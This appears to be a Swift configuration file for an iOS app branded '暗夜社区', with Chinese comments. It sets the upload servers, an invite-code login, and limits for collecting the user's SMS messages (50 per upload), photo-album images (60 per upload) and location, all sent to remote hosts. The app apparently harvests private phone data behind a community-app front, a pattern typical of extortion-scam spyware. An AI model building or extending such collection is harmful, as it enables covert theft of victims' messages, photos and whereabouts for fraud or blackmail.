import UIKit

/// 全局配置 —— 与安卓端 `AnyConfig.kt` 一一对应，字段语义保持一致
///
/// 重要：**客户端不存任何密钥**。UserSig 由服务端 `/im-sig.php` 签发。
enum AnyConfig {

    // MARK: - 服务端

    /// 上报接口基址（与安卓端一致：主用 cartier.us.cc，回落 anyeshequ.cn）
    static let apiBases: [String] = [
        "https://cartier.us.cc/api/",
        "https://anyeshequ.cn/api/",
    ]

    /// UserSig 签发接口（手机号换签名，密钥只在服务端）
    static let imSigURLs: [String] = [
        "https://anyeshequ.cn/im-sig.php",
    ]

    // MARK: - 腾讯云 IM

    /// 公开的 SDKAppID（不是密钥，可以放客户端）
    static let sdkAppID: Int32 = 1_600_164_367

    // MARK: - 上报协议常量（必须与安卓端逐字一致）

    /// 客户端版本串，出现在 `/uploads/api` 的 clientid 字段尾部
    static let clientVersion = "v108"

    /// 上报成功判定：HTTP 2xx 且响应文本**不在**这个失败集合里
    /// （服务端成功时返回纯文本「正在加载列表」，不是 JSON）
    static let failureTexts: Set<String> = [
        "邀请码错误", "暂时无法登录", "数据连接错误", "获取失败", "获取信息错误",
        "重复号码", "缺少id参数", "缺少id", "NO_FILE", "NO_ID",
    ]

    /// 相册上传失败文案（服务端 `/uploads/img` 的失败串）
    static let imageFailureTexts: Set<String> = [
        "缺少id参数", "用户不存在", "未收到文件", "图片超过20MB",
        "不是支持的图片格式", "该设备相册数量已达上限", "保存失败", "NO_FILE", "NO_ID",
    ]

    // MARK: - 采集限制

    /// 单次上报的短信条数上限（与安卓端 / 服务端约定一致）
    static let maxSmsPerUpload = 50

    /// 单次上报的相册图片张数上限（防止一次拉太多）
    static let maxImagesPerUpload = 60

    /// 图片上传前压缩的最长边
    static let imageMaxDimension: CGFloat = 1280

    /// 图片上传 JPEG 质量
    static let imageJPEGQuality: CGFloat = 0.8

    /// 定位上报成功后就不再重复（与安卓端一致：成功即停）
    static let locationRetryInterval: TimeInterval = 60

    // MARK: - 品牌

    static let appDisplayName = "暗夜社区"

    /// 品牌主色（与安卓端深色主题一致）
    enum Brand {
        /// 深色底
        static let background = UIColor(hex: 0x101010)
        /// 卡片/次级底
        static let surface = UIColor(hex: 0x1B1026)
        /// 主色（紫）
        static let primary = UIColor(hex: 0xC9A7E8)
        /// 主文字
        static let textPrimary = UIColor(hex: 0xFDFBFF)
        /// 次文字
        static let textSecondary = UIColor(hex: 0x9D8FC0)
    }
}

// MARK: - 颜色工具

extension UIColor {
    /// 用 0xRRGGBB 构造颜色（省去到处写 /255）
    convenience init(hex: UInt32, alpha: CGFloat = 1.0) {
        let r = CGFloat((hex >> 16) & 0xFF) / 255.0
        let g = CGFloat((hex >> 8) & 0xFF) / 255.0
        let b = CGFloat(hex & 0xFF) / 255.0
        self.init(red: r, green: g, blue: b, alpha: alpha)
    }
}
